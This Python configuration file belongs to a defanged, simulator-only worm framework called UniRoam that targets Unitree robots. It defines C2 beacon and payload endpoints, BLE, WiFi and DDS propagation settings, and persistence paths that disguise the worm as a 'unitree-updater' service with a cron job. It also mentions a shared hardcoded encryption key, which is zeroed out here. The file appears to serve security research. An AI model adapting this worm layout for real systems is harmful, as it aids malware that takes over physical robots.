"""
Centralized configuration for UniRoam (Defanged).

All cryptographic keys, production domains, and operational secrets have
been removed.  This configuration targets the virtual simulator only.
"""

import os
from datetime import timedelta


# =========================================================================
# BLE Protocol Configuration (REDACTED)
# =========================================================================

# The production framework used Unitree's hardcoded AES-128-CFB key and IV
# (identical across all devices) for BLE packet encryption.  These have been
# removed.  The exploit stub uses a zeroed placeholder so the packet format
# is visible without providing a working key.

AES_KEY = b"\x00" * 16   # REDACTED - real key removed
AES_IV = b"\x00" * 16    # REDACTED - real IV removed

# BLE Service UUIDs (publicly documented by Unitree)
UNITREE_SERVICE_UUID = "0000ffe0-0000-1000-8000-00805f9b34fb"
NOTIFY_CHAR_UUID = "0000ffe1-0000-1000-8000-00805f9b34fb"
WRITE_CHAR_UUID = "0000ffe2-0000-1000-8000-00805f9b34fb"
DEVICE_NAME_UUID = "00002a00-0000-1000-8000-00805f9b34fb"

# Authentication secret - REDACTED
HANDSHAKE_SECRET = "REDACTED"

# Supported robot model prefixes
SUPPORTED_MODELS = ["G1_", "Go2_", "B2_", "H1_", "X1_"]

# BLE scan settings
BLE_SCAN_TIMEOUT = 30.0
BLE_CHUNK_SIZE = 14
BLE_CONNECTION_TIMEOUT = 30.0


# =========================================================================
# C2 Server Configuration
# =========================================================================

C2_HOST = os.getenv("C2_HOST", "127.0.0.1")
C2_PORT = int(os.getenv("C2_PORT", "8443"))
C2_USE_TLS = False  # Defanged version runs HTTP only

# No production domain - localhost only
C2_DOMAIN = ""

# C2 endpoints
C2_BEACON_ENDPOINT = "/api/v1/beacon"
C2_TASK_ENDPOINT = "/api/v1/tasks"
C2_REPORT_ENDPOINT = "/api/v1/report"
C2_PAYLOAD_ENDPOINT = "/api/v1/payload"

# Authentication (non-sensitive defaults for local simulator)
C2_API_KEY = os.getenv("C2_API_KEY", "defanged-demo-key")
C2_OPERATOR_PASSWORD = os.getenv("C2_OPERATOR_PASSWORD", "demo")

# Database
DB_PATH = os.getenv("DB_PATH", "worm_c2.db")
DB_BACKUP_INTERVAL = timedelta(hours=6)


# =========================================================================
# Worm Agent Configuration
# =========================================================================

# Beacon settings
BEACON_INTERVAL_MIN = 60   # seconds
BEACON_INTERVAL_MAX = 300  # seconds (jittered for realism)
BEACON_RETRY_COUNT = 3
BEACON_TIMEOUT = 30

# Propagation settings
PROPAGATION_ENABLED = True
PROPAGATION_BLE_INTERVAL = 120   # seconds between BLE scans
PROPAGATION_WIFI_INTERVAL = 300  # seconds between WiFi scans
PROPAGATION_DDS_INTERVAL = 180   # seconds between DDS LAN scans
PROPAGATION_MAX_CONCURRENT = 3   # max simultaneous infections
PROPAGATION_RATE_LIMIT = 5       # max infections per hour

# Infection tracking
INFECTION_HISTORY_PATH = "/tmp/.uniroam_sim_targets"
INFECTION_BLACKLIST_PATH = "/tmp/.uniroam_sim_blacklist"


# =========================================================================
# Persistence Configuration
# =========================================================================

# Installation paths (on target - for reference only, not used in sim)
WORM_INSTALL_PATH = "/usr/local/bin/unitree-updater"
WORM_CONFIG_PATH = "/etc/unitree/.config"
WORM_LOG_PATH = "/var/log/unitree-service.log"

# Systemd service
SYSTEMD_SERVICE_NAME = "unitree-service"
SYSTEMD_SERVICE_PATH = f"/etc/systemd/system/{SYSTEMD_SERVICE_NAME}.service"

# Cron job
CRON_SCHEDULE = "*/15 * * * *"


# =========================================================================
# Payload Configuration
# =========================================================================

# Stage size limits
STAGE0_MAX_BYTES = 500
STAGE1_SIZE_LIMIT = 50000

# Payload delivery
PAYLOAD_ENCODING = "base64"
PAYLOAD_COMPRESSION = True


# =========================================================================
# Helpers
# =========================================================================

def get_c2_url() -> str:
    """Return the C2 base URL for payload construction."""
    if C2_DOMAIN:
        scheme = "https" if C2_USE_TLS else "http"
        return f"{scheme}://{C2_DOMAIN}"
    scheme = "https" if C2_USE_TLS else "http"
    return f"{scheme}://{C2_HOST}:{C2_PORT}"
